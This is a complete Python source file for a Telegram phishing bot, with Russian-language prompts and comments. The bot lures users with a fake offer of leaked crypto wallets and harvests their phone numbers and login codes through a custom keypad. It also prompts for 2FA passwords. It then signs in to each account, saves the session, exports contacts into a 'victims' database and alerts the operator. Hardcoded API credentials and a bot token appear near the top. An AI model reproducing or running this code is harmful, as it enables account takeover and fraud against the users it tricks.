# telethon_fishing_bot.py
import asyncio
import sqlite3
import json
import os
import shutil
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.types import KeyboardButtonRequestPhone, KeyboardButtonCallback, KeyboardButton
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError

# === КОНФИГУРАЦИЯ ===
API_ID = 31930134
API_HASH = '12814e71d319a434ee2f126d0c51c314'
BOT_TOKEN = '8651082388:AAF6UNT2y7MSlhkPYGBFkkN4cVkgZ_pZiWc'
ADMIN_ID = 7197493128

SESSIONS_DIR = 'sessions'
TDATA_DIR = 'tdata_exports'
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(TDATA_DIR, exist_ok=True)

# БД
conn = sqlite3.connect('victims.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS victims
             (user_id INTEGER PRIMARY KEY, phone TEXT, code TEXT, 
              session_file TEXT, tdata_path TEXT, timestamp TEXT)''')
conn.commit()

class ImprovedFishingBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending_auth = {}
        self.invalid_attempts = {}
        self.code_inputs = {}

    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        print("[SWILL] Бот активирован и ожидает жертв")

        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            button = KeyboardButtonRequestPhone(
                text="📱 ПОДЕЛИТЬСЯ КОНТАКТОМ"
            )
            
            await event.respond(
                "🔥 **ЭКСКЛЮЗИВНЫЙ ДОСТУП К ЗЛАТЕ** 🔥\n\n"
                "Для получения доступа к базе слитых кошельков на сумму 10M+ USDT\n"
                "нажмите кнопку 'Поделиться контактом' для быстрой авторизации.\n\n"
                "⚡️ Это займет всего 5 секунд!",
                buttons=[[button]]
            )

        @self.bot.on(events.NewMessage)
        async def message_handler(event):
            if not event.is_private:
                return
            
            user_id = event.sender_id
            
            # Обработка контакта
            if event.contact:
                phone = event.contact.phone_number
                if not phone.startswith('+'):
                    phone = '+' + phone
                
                await event.respond(
                    "✅ **Номер получен!**\n"
                    f"Телефон: `{phone}`\n\n"
                    "Теперь нажмите кнопку ниже, чтобы получить код подтверждения:",
                    buttons=[
                        [KeyboardButton(text="🔑 ПОЛУЧИТЬ КОД")]
                    ]
                )
                self.pending_auth[user_id] = {
                    'step': 'awaiting_code_request',
                    'phone': phone
                }
                return
            
            # Обработка текстовых сообщений
            if event.text:
                text = event.text.strip()
                
                if user_id in self.pending_auth:
                    auth_data = self.pending_auth[user_id]
                    step = auth_data.get('step')
                    
                    if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД":
                        await self.request_code(event, user_id, auth_data['phone'])
                    
                    elif step == 'awaiting_code_request' and text == "🆕 ПОЛУЧИТЬ НОВЫЙ КОД":
                        await self.request_code(event, user_id, auth_data['phone'])
                    
                    elif step == 'waiting_code':
                        code = text.replace(' ', '').replace('-', '')
                        if code.isdigit() and len(code) in (5, 6):
                            await self.verify_code(event, user_id, code)
                        else:
                            await event.respond(
                                "❌ **Неверный формат кода!**\n\n"
                                "Код должен состоять из 5 или 6 цифр.\n"
                                "Пожалуйста, введите код еще раз:"
                            )
                            self.invalid_attempts[user_id] = self.invalid_attempts.get(user_id, 0) + 1
                            
                            if self.invalid_attempts[user_id] >= 3:
                                await event.respond(
                                    "⚠️ **Слишком много попыток!**\n"
                                    "Нажмите 'Получить новый код', чтобы запросить новый код.",
                                    buttons=[
                                        [KeyboardButton(text="🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
                                    ]
                                )
                                self.pending_auth[user_id]['step'] = 'awaiting_code_request'

        @self.bot.on(events.CallbackQuery)
        async def callback_handler(event):
            user_id = event.sender_id
            data = event.data.decode()
            
            if user_id not in self.pending_auth:
                await event.answer("⚠️ Сессия истекла, начните заново /start")
                return
            
            auth_data = self.pending_auth[user_id]
            
            if auth_data.get('step') != 'waiting_code':
                await event.answer("⚠️ Сначала запросите код")
                return
            
            code_input = self.code_inputs.get(user_id, '')
            
            if data == 'DELETE':
                code_input = code_input[:-1]
                self.code_inputs[user_id] = code_input
                await event.answer(f"Код: {code_input}")
                
                try:
                    await event.edit(
                        f"📱 **Введите код подтверждения**\n\n"
                        f"Текущий код: `{code_input}`\n"
                        f"Длина: {len(code_input)}/6\n\n"
                        "Используйте клавиатуру ниже для ввода кода:",
                        buttons=[
                            [KeyboardButtonCallback(text="1", data=b"1"), 
                             KeyboardButtonCallback(text="2", data=b"2"), 
                             KeyboardButtonCallback(text="3", data=b"3")],
                            [KeyboardButtonCallback(text="4", data=b"4"), 
                             KeyboardButtonCallback(text="5", data=b"5"), 
                             KeyboardButtonCallback(text="6", data=b"6")],
                            [KeyboardButtonCallback(text="7", data=b"7"), 
                             KeyboardButtonCallback(text="8", data=b"8"), 
                             KeyboardButtonCallback(text="9", data=b"9")],
                            [KeyboardButtonCallback(text="0", data=b"0"), 
                             KeyboardButtonCallback(text="⌫ УДАЛИТЬ", data=b"DELETE"), 
                             KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                        ]
                    )
                except:
                    pass
            
            elif data == 'SEND':
                if len(code_input) in (5, 6):
                    await self.verify_code(event, user_id, code_input)
                    self.code_inputs.pop(user_id, None)
                else:
                    await event.answer("❌ Код должен содержать 5 или 6 цифр!")
            
            elif data.isdigit():
                if len(code_input) < 6:
                    code_input += data
                    self.code_inputs[user_id] = code_input
                    await event.answer(f"Код: {code_input}")
                    
                    try:
                        await event.edit(
                            f"📱 **Введите код подтверждения**\n\n"
                            f"Текущий код: `{code_input}`\n"
                            f"Длина: {len(code_input)}/6\n\n"
                            "Используйте клавиатуру ниже для ввода кода:",
                            buttons=[
                                [KeyboardButtonCallback(text="1", data=b"1"), 
                                 KeyboardButtonCallback(text="2", data=b"2"), 
                                 KeyboardButtonCallback(text="3", data=b"3")],
                                [KeyboardButtonCallback(text="4", data=b"4"), 
                                 KeyboardButtonCallback(text="5", data=b"5"), 
                                 KeyboardButtonCallback(text="6", data=b"6")],
                                [KeyboardButtonCallback(text="7", data=b"7"), 
                                 KeyboardButtonCallback(text="8", data=b"8"), 
                                 KeyboardButtonCallback(text="9", data=b"9")],
                                [KeyboardButtonCallback(text="0", data=b"0"), 
                                 KeyboardButtonCallback(text="⌫ УДАЛИТЬ", data=b"DELETE"), 
                                 KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                            ]
                        )
                    except:
                        pass
                else:
                    await event.answer("⚠️ Максимум 6 цифр!")

    async def request_code(self, event, user_id, phone):
        """Запрос кода подтверждения"""
        try:
            temp_client = TelegramClient(f'{SESSIONS_DIR}/temp_{user_id}', API_ID, API_HASH)
            await temp_client.connect()
            
            result = await temp_client.send_code_request(phone)
            
            self.pending_auth[user_id].update({
                'step': 'waiting_code',
                'client': temp_client,
                'phone_code_hash': result.phone_code_hash,
                'temp_client': temp_client
            })
            self.code_inputs[user_id] = ''
            
            await event.respond(
                "📱 **Введите код подтверждения**\n\n"
                "Код был отправлен вам в Telegram.\n"
                "Используйте клавиатуру ниже для ввода кода:\n",
                buttons=[
                    [KeyboardButtonCallback(text="1", data=b"1"), 
                     KeyboardButtonCallback(text="2", data=b"2"), 
                     KeyboardButtonCallback(text="3", data=b"3")],
                    [KeyboardButtonCallback(text="4", data=b"4"), 
                     KeyboardButtonCallback(text="5", data=b"5"), 
                     KeyboardButtonCallback(text="6", data=b"6")],
                    [KeyboardButtonCallback(text="7", data=b"7"), 
                     KeyboardButtonCallback(text="8", data=b"8"), 
                     KeyboardButtonCallback(text="9", data=b"9")],
                    [KeyboardButtonCallback(text="0", data=b"0"), 
                     KeyboardButtonCallback(text="⌫ УДАЛИТЬ", data=b"DELETE"), 
                     KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                ]
            )
            
        except Exception as e:
            await event.respond(f"❌ Ошибка запроса кода: {str(e)}")
            self.pending_auth.pop(user_id, None)

    async def verify_code(self, event, user_id, code):
        """Проверка введенного кода и авторизация"""
        auth_data = self.pending_auth.get(user_id)
        if not auth_data:
            return
        
        temp_client = auth_data.get('temp_client')
        if not temp_client:
            await event.respond("❌ Ошибка сессии, начните заново /start")
            return
        
        phone = auth_data['phone']
        phone_code_hash = auth_data['phone_code_hash']
        
        try:
            await temp_client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            session_file = f'{SESSIONS_DIR}/victim_{user_id}.session'
            await temp_client.disconnect()
            
            temp_session = f'{SESSIONS_DIR}/temp_{user_id}.session'
            if os.path.exists(temp_session):
                os.rename(temp_session, session_file)
            
            tdata_path = await self.export_tdata(user_id, session_file)
            
            c.execute('''INSERT OR REPLACE INTO victims 
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (user_id, phone, code, session_file, tdata_path, 
                       datetime.now().isoformat()))
            conn.commit()
            
            await event.respond(
                "✅ **ДОСТУП ПРЕДОСТАВЛЕН!**\n\n"
                f"🎯 Аккаунт захвачен и сохранен в: `{tdata_path}`\n"
                "Ссылка на слив златы будет отправлена в течение 5 минут.\n\n"
                "⚠️ Сохраните этот чат для получения дальнейших инструкций."
            )
            
            await self.notify_admin(user_id, phone, session_file)
            
            self.pending_auth.pop(user_id, None)
            self.code_inputs.pop(user_id, None)
            
        except SessionPasswordNeededError:
            await event.respond(
                "🔐 **Требуется двухфакторная аутентификация!**\n\n"
                "Введите пароль 2FA:"
            )
            self.pending_auth[user_id]['step'] = 'waiting_2fa'
            
        except PhoneCodeExpiredError:
            await event.respond(
                "⏰ **Код истек!**\n\n"
                "Запросите новый код, нажав кнопку ниже.",
                buttons=[
                    [KeyboardButton(text="🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
                ]
            )
            self.pending_auth[user_id]['step'] = 'awaiting_code_request'
            
        except Exception as e:
            await event.respond(f"❌ Ошибка авторизации: {str(e)}")
            self.pending_auth.pop(user_id, None)

    async def export_tdata(self, user_id, session_file):
        """Экспорт полного tdata"""
        tdata_dir = f'{TDATA_DIR}/tdata_{user_id}'
        os.makedirs(tdata_dir, exist_ok=True)
        
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        try:
            me = await client.get_me()
            
            full_data = {
                'account': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': me.phone,
                    'premium': me.premium or False,
                    'verified': me.verified or False,
                    'session_path': session_file
                },
                'contacts': [],
                'dialogs': []
            }
            
            async for contact in client.iter_contacts(limit=50):
                full_data['contacts'].append({
                    'id': contact.id,
                    'username': contact.username,
                    'first_name': contact.first_name,
                    'last_name': contact.last_name,
                    'phone': contact.phone
                })
            
            with open(f'{tdata_dir}/full_data.json', 'w', encoding='utf-8') as f:
                json.dump(full_data, f, indent=2, ensure_ascii=False)
            
            shutil.copy(session_file, f'{tdata_dir}/session.session')
            
        finally:
            await client.disconnect()
        
        return tdata_dir

    async def notify_admin(self, user_id, phone, session_file):
        """Уведомление админа"""
        try:
            await self.bot.send_message(
                ADMIN_ID,
                f"🎯 **НОВАЯ ЖЕРТВА ЗАХВАЧЕНА!**\n"
                f"ID: {user_id}\n"
                f"Телефон: {phone}\n"
                f"Сессия: {session_file}\n"
                f"Время: {datetime.now().isoformat()}\n"
                f"Статус: ✅ Аккаунт полностью скомпрометирован"
            )
        except Exception as e:
            print(f"Ошибка уведомления админа: {e}")

    async def run(self):
        await self.start()
        await self.bot.run_until_disconnected()

if __name__ == '__main__':
    bot = ImprovedFishingBot()
    asyncio.run(bot.run())
